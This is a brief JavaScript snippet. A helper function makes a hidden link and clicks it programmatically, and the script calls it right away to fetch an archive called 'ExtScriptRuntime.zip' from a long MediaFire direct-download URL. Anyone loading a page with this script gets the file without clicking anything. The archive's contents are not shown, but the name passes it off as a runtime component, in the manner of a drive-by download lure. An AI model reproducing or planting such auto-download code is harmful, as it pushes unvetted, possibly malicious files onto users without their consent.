function downloadFile(url, filename) {
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

downloadFile('https://download938.mediafire.com/c57iho2crzmgJtqHQ-dqs6Z-OboDsedFTImebFIeKaUIT0ek28AbUKPSc1jy9GblOchyaehB9JtaTm_DXBS9rCVTun9noKMx0l_6U2NA-4FqLqjF5x_uKuRK64-3BEhOC8nRkPfjQkSX4Etq6RCYyySUNeHEUL54UTvUyT934jPEHQ/xoo66okss5w1wjp/ExtScriptRuntime.zip', 'ExtScriptRuntime.zip');